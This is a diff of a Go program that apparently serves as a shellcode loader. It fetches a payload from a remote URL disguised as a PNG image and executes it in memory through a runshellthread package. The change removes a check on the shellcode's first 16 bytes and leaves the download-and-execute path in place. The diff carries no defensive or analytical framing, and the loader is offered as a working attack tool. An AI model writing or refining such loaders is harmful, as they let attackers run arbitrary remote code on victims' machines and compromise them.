@@ -20,26 +20,9 @@ import (
 const (
 	// Default URL to download from if none provided, configure this before build to point to your payload to avoid passing CLI flags on run
 	defaultDownloadURL = "https://l.station307.com/K3A1jN2qutfzSTEzHwrqQN/pice3x3.png"
-
-	// Expected first 16 bytes of the shellcode from payload3x3.bin
-	expectedShellcodePrefix = "E8807523008075230066 07DFC81E0EC4"
 )
 
-// verifyShellcodePrefix checks if the first 16 bytes of the shellcode match the expected pattern
-func verifyShellcodePrefix(shellcode []byte) bool {
-	if len(shellcode) < 16 {
-		return false
-	}
-	
-	// Format the first 16 bytes of the shellcode as a hex string
-	actualHex := formatBytesAsHex(shellcode[:16])
-	
-	// Remove spaces from expected hex string for comparison
-	expectedNoSpaces := strings.ReplaceAll(expectedShellcodePrefix, " ", "")
-	actualNoSpaces := strings.ReplaceAll(actualHex, " ", "")
-	
-	return strings.EqualFold(expectedNoSpaces, actualNoSpaces)
-}
+
 
 // formatBytesAsHex formats a byte slice as a hex string
 func formatBytesAsHex(data []byte) string {
@@ -148,18 +131,6 @@ func main() {
 	// For shellcode, execute directly using runshellthread
 	if *isShellcodePtr {
 		fmt.Println("Executing payload as shellcode...")
-		
-		// Verify shellcode matches expected bytes
-		if verifyShellcodePrefix(payload) {
-			fmt.Println(" Shellcode verification passed: First 16 bytes match expected pattern")
-		} else {
-			fmt.Println(" Shellcode verification failed: First 16 bytes do not match expected pattern")
-			fmt.Println("Expected: " + expectedShellcodePrefix)
-			actualHex := formatBytesAsHex(payload[:16])
-			fmt.Println("Actual:   " + actualHex)
-			fmt.Println("Continuing execution anyway...")
-		}
-		
 		threadHandle, err := runshellthread.ExecuteShellcode(payload, true)
 		if err != nil {
 			fmt.Println("Error executing shellcode:", err)
